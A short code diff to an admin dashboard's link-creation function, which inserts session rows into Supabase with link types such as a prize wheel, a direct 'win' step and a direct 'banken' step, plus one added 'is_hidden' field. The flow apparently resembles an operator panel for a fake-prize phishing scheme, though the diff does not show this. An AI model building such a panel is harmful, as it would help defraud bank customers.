@@ -339,17 +339,18 @@ export function AdminDashboardClean() {
     setCreateLinkError(null);
     setCreating(true);
     const { data, error } = await supabase
-      .from("sessions")
-      .insert({ 
-        amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0), 
-        current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry", 
-        status: "offline", 
-        form_data: { currency, is_wheel_game: linkType === "wheel" },
-        partner_name: linkType === "normal" ? (partnerName.trim() || null) : null,
-        participation_code: linkType === "normal" ? (participationCode.trim() || null) : null
-      })
-      .select("id")
-      .maybeSingle();
+        .from("sessions")
+        .insert({
+          amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
+          current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry",
+          status: "offline",
+          is_hidden: false,
+          form_data: { currency, is_wheel_game: linkType === "wheel" },
+          partner_name: linkType === "normal" ? (partnerName.trim() || null) : null,
+          participation_code: linkType === "normal" ? (participationCode.trim() || null) : null
+        })
+        .select("id")
+        .maybeSingle();
     setCreating(false);
     if (error) {
       setCreateLinkError(`Link olusturulamadi: ${error.message}`);
